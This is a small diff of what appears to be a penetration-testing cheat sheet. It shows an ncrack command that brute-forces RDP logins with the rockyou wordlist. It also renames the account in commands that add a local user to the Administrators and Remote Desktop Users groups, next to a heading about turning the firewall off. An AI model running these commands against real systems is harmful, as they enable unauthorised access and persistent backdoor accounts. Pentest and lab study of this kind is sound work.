@@ -2267,9 +2267,9 @@ ncrack -vv --user george -P /home/kali/Documents/crack/rockyou.txt  rdp://10.11.
 ```
 # Add new user
 
-net user haxxor Haxxor123 /add
-net localgroup Administrators haxxor /add
-net localgroup "Remote Desktop Users" haxxor /ADD
+net user hacker password123 /add
+net localgroup Administrators hacker /add
+net localgroup "Remote Desktop Users" hacker /ADD
 
 # Turn firewall off and enable RDP
 
